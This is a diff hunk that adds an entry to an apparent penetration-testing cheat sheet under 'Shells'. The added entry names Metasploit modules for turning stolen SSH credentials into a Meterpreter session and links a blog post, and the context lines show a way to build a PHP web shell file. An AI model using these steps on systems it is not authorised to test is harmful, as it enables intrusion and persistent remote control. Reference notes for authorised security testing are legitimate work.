@@ -884,6 +884,14 @@ Shells
     cat shell.php | pbcopy && echo '&lt;?php ' | tr -d '\\n' &gt;
     shell.php && pbpaste &gt;&gt; shell.php
 
+-   SSH to Meterpreter:
+
+      use auxiliary/scanner/ssh/ssh_login
+      
+      use post/multi/manage/shell_to_meterpreter
+      
+      https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/
+
 -   Compiling Windows Exploits on Kali
 
     -   wget -O mingw-get-setup.exe
